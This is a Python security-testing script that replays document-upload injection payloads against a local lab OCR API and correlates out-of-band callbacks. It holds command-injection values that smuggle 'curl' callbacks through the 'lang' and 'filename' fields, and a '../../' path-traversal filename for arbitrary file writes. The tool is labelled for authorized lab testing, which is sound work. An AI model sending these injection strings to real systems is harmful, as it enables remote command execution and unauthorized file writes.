#!/usr/bin/env python3
"""
local_replay.py -- headless port of the Document Injection Tester core loop.

The Burp extension (doc_injection_tester.py) needs Burp + Jython + a reachable
Collaborator. This reimplements its *logic* for offline CLI use against a local
lab target, so the payloads/ templates can be validated without Burp running:

  * sends a baseline valid PNG first (length/status delta reference),
  * loads every file in payloads/ as an extra payload,
  * substitutes the {{COLLAB}} token per-payload with a UNIQUE local marker
    (127.0.0.1:<port>/p<idx>) so one catcher hit maps to exactly one row,
  * base64-encodes each, inserts it into the JSON document field,
  * POSTs to the target, records status / length / kind / notes,
  * adds field-level mutations (lang, filename) to exercise the command-
    injection and path-traversal sinks the document body cannot reach,
  * correlates the OOB catcher log and prints a results table.

AUTHORIZED LOCAL LAB USE ONLY. Target must be a system you own/operate.
"""
import argparse, base64, json, os, time, urllib.request

# minimal valid 1x1 PNG (baseline known-good image)
BASELINE_PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+M9QDwADhgGAWjR9"
    "awAAAABJRU5ErkJggg==")

COLLAB_TOKEN = "{{COLLAB}}"


def post(target, field, template, raw_bytes, extra_fields=None):
    b64 = base64.b64encode(raw_bytes).decode()
    value = template.replace("{{B64}}", b64)
    body = {field: value}
    if extra_fields:
        body.update(extra_fields)
    data = json.dumps(body).encode()
    req = urllib.request.Request(target, data=data,
                                 headers={"Content-Type": "application/json"})
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=30)
        code, payload = r.getcode(), r.read()
    except urllib.error.HTTPError as e:
        code, payload = e.code, e.read()
    except Exception as e:
        return {"status": "ERR", "len": 0, "ms": 0, "resp": str(e)}
    return {"status": code, "len": len(payload),
            "ms": int((time.time() - t0) * 1000),
            "resp": payload.decode("utf-8", "replace")}


def load_oob(logpath):
    hits = []
    if os.path.exists(logpath):
        for line in open(logpath):
            line = line.strip()
            if line:
                try: hits.append(json.loads(line))
                except Exception: pass
    return hits


def summarize(resp_text):
    try:
        j = json.loads(resp_text)
    except Exception:
        return "(non-JSON resp)"
    bits = []
    if j.get("kind"):  bits.append("kind=" + j["kind"])
    for n in (j.get("notes") or [])[:4]:
        bits.append(n)
    if j.get("text"): bits.append("text=" + repr(j["text"][:60]))
    if j.get("pipeline"): bits.append("pipe=" + repr(j["pipeline"][:80]))
    return " | ".join(bits)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:5000/api/ocr")
    ap.add_argument("--collab", default="127.0.0.1:9000")
    ap.add_argument("--payloads", default=os.path.join(
        os.path.dirname(os.path.abspath(__file__)), "..", "payloads"))
    ap.add_argument("--field", default="document")
    ap.add_argument("--template", default="{{B64}}")
    ap.add_argument("--ooblog", default=os.path.join(
        os.path.dirname(os.path.abspath(__file__)), "oob_hits.jsonl"))
    ap.add_argument("--wait", type=float, default=2.0,
                    help="seconds to wait for async OOB before correlating")
    a = ap.parse_args()

    rows = []

    # 1) baseline
    r = post(a.target, a.field, a.template, BASELINE_PNG)
    base_len = r["len"]
    rows.append(("baseline_png", "-", r["status"], r["len"], 0, r["ms"],
                 summarize(r["resp"])))

    # 2) document payloads from the dir, each with a unique {{COLLAB}} marker
    pdir = os.path.abspath(a.payloads)
    files = sorted(f for f in os.listdir(pdir)
                   if f != "README.md" and os.path.isfile(os.path.join(pdir, f)))
    token_map = {}
    for idx, fn in enumerate(files):
        raw = open(os.path.join(pdir, fn), "rb").read()
        marker = "p%d" % idx
        collab = "%s/%s" % (a.collab, marker)         # unique path marker
        raw = raw.replace(COLLAB_TOKEN.encode(), collab.encode())
        token_map["/%s" % marker] = "file:" + fn
        r = post(a.target, a.field, a.template, raw)
        rows.append(("file:" + fn, marker, r["status"], r["len"],
                     r["len"] - base_len, r["ms"], summarize(r["resp"])))

    # 3) field-level mutations (sinks the document body alone cannot reach)
    #    3a: command injection via 'lang'
    collab = "%s/plang" % a.collab
    token_map["/plang"] = "field:lang cmd-injection"
    r = post(a.target, a.field, a.template, BASELINE_PNG,
             extra_fields={"lang": "eng; curl http://%s/ #" % collab})
    rows.append(("field:lang cmdinj", "plang", r["status"], r["len"],
                 r["len"] - base_len, r["ms"], summarize(r["resp"])))

    #    3b: command injection via 'filename'
    collab = "%s/pfname" % a.collab
    token_map["/pfname"] = "field:filename cmd-injection"
    r = post(a.target, a.field, a.template, BASELINE_PNG,
             extra_fields={"filename": "x.png; curl http://%s/ #" % collab})
    rows.append(("field:filename cmdinj", "pfname", r["status"], r["len"],
                 r["len"] - base_len, r["ms"], summarize(r["resp"])))

    #    3c: path traversal arbitrary write
    proof = ("TRAVERSAL-PROOF-%d" % int(time.time())).encode()
    r = post(a.target, a.field, a.template, proof,
             extra_fields={"filename": "../../TRAVERSAL_PROOF.txt"})
    rows.append(("field:filename traversal", "-", r["status"], r["len"],
                 r["len"] - base_len, r["ms"], summarize(r["resp"])))

    # 4) correlate OOB
    time.sleep(a.wait)
    hits = load_oob(a.ooblog)
    hit_tokens = set()
    for h in hits:
        for tok in token_map:
            if h.get("path", "").startswith(tok + "/") or h.get("path", "") == tok \
               or h.get("path", "").startswith(tok):
                hit_tokens.add(tok)

    # 5) print table
    print("\n=== Document Injection replay results ===")
    print("target=%s  collab=%s  payloads=%s" % (a.target, a.collab, pdir))
    print("-" * 118)
    print("%-26s %-7s %-6s %-7s %-7s %-6s %s" %
          ("payload", "token", "status", "len", "dlen", "ms", "notes"))
    print("-" * 118)
    for name, marker, status, ln, dlen, ms, notes in rows:
        tok = "/%s" % marker if marker not in ("-",) else ""
        hit = "  <<< OOB HIT" if tok and tok in hit_tokens else ""
        print("%-26s %-7s %-6s %-7s %+6d %-6s %s%s" %
              (name[:26], marker, status, ln, dlen, ms, notes[:60], hit))
    print("-" * 118)
    print("OOB interactions logged: %d" % len(hits))
    for h in hits:
        label = next((token_map[t] for t in token_map
                      if h.get("path", "").startswith(t)), "?")
        print("  %s %-24s -> %s" % (h.get("method"), h.get("path"), label))


if __name__ == "__main__":
    main()
